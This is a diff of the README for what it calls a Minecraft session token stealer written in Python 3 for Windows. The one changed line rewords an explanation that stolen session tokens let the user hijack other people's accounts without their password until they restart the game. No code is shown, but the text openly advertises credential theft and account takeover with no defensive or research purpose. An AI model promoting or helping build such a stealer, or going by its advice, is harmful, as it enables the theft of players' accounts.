@@ -1,7 +1,7 @@
 <h1 align="center">Minecraft Session Token Stealer</h1>
 <p align="center">A Minecraft session token strealer written in Python 3.</p>
 
-**What can I use the session tokens for?** You can use these tokens to hijack accounts (gain access to them without their password) temporarily, as if they restart their game, their session token will get changed.
+**What can I use the session tokens for?** You can use session tokens to hijack accounts (gain access to them without having their password) temporarily, as if they restart their game, their session token will get changed.
 
 This version of the stealer only supports **Windows**.
 
